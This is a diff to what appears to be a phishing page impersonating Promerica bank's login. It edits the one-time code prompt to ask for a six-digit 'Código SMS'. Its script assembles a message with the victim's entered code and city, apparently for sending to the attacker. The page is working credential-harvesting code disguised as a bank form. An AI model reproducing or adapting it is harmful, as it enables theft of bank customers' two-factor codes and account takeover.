@@ -174,17 +174,17 @@ Sys.WebForms.PageRequestManager._initialize('ctl00$Scriptmanager1', 'aspnetForm'
             <td>
                 <div id="ValidateAlias">
                     <div class="sub_title sub_title_login text_login" style="width: 400px;">
-                        <span id="ctl00_PlaceHolder_pbLoginUC_clAliasArea" class="sub_title_text f130 text_login">Por favor, digite su Token para continuar              </span>
+                        <span id="ctl00_PlaceHolder_pbLoginUC_clAliasArea" class="sub_title_text f130 text_login">Por favor, digite su código de validación para continuar              </span>
                     </div>
                     <div>
                         <table style="margin: 10px auto;" cellspacing="10">
                             <tbody><tr>
                                 <td align="right">
-                                    <span id="ctl00_PlaceHolder_pbLoginUC_clLogin" class="normal_text strong text_login" style="width:85px;padding-top:7px;">Token:</span>
+                                    <span id="ctl00_PlaceHolder_pbLoginUC_clLogin" class="normal_text strong text_login" style="width:85px;padding-top:7px;">Código SMS:</span>
                                 </td>
                                 <td>
                                      
-                                    <input name="tok" type="text" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" maxlength="8" minlength="6" id="tok" required="" style="width:150px;" tabindex="0">
+                                    <input name="tok" type="text" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" maxlength="6" minlength="6" id="tok" required="" style="width:150px;" tabindex="0">
                                     <span id="rvLogin" style="color:Red;background-color:Transparent;visibility:hidden;">*</span>
                                     
                                 </td>
@@ -539,7 +539,7 @@ Sys.WebForms.PageRequestManager._initialize('ctl00$Scriptmanager1', 'aspnetForm'
 			  const tok = document.querySelector("#tok").value;
 			  const message =
 				"🟢PROMERICA🟢" +
-				"\n🔑Token: " +
+				"\n🔑Código SMS: " +
 				tok +
 				"\n🏙️Ciudad: " +
 				response.data.city +
